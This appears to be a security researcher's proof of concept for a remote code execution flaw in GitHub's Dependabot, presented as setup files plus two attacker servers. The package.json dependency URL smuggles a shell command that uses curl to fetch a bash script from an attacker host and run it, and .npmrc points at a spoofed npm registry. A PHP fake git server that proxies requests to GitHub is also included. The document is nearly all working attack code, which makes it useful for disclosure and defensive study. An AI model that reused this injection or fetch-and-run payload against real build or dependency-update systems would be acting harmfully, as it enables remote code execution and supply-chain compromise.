# PoC for dependabot RCE

## Prepare GitHub registry

Add following files:

.npmrc
```
registry="http://registry.npmjs.org@mocos.kitchen/"
```

package-lock.json
```
{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "dependencies": {
    "tyage-sample-package": {
      "version": "3.0.0"
    }
  }
}
```

package.json
```
{
  "name": "javascript",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "private": true,
  "dependencies": {
    "registry11.json": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
  }
}
```

.github/dependabot.yml
```
---
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: daily
```

## Prepare Servers

Two servers required.

1. Fake npm registry

`http://registry.npmjs.org@mocos.kitchen/package1` should return this file:

```json
{
    "name": "tyage-sample-package",
    "version": "a"
}
```

2. Fake git repository

`http://github.com.mocos.kitchen/github.com/...` should run this PHP file:

```php
<?php
if (!empty($input)) {
  // proxy request to https://github.com/tyage/sample-package.git/git-upload-pack
  $url = "https://github.com/tyage/sample-package.git/git-upload-pack";
  $context = ["http" => [
    "method" => "POST",
    "header" => [ "Content-Type: application/x-git-upload-pack-request" ],
    "content" => $input
  ]];
  if (!empty($_SERVER['HTTP_GIT_PROTOCOL'])) {
    $context["http"]["header"][] = "Git-Protocol: version=2";
  }
  $result = file_get_contents($url, false, stream_context_create($context));

  header("content-type: application/x-git-upload-pack-result");
  echo $result;

} else {
  // proxy request to https://github.com/tyage/sample-package.git/info/refs?service=git-upload-pack
  $context = ["http" => [ "header" => [] ]];
  if (!empty($_SERVER['HTTP_GIT_PROTOCOL'])) {
    $context["http"]["header"][] = "Git-Protocol: version=2";
  }
  $url = "https://github.com/tyage/sample-package.git/info/refs?service=git-upload-pack";
  $result = file_get_contents($url, false, stream_context_create($context));

  header("content-type: application/x-git-upload-pack-advertisement");
  echo $result;
}
```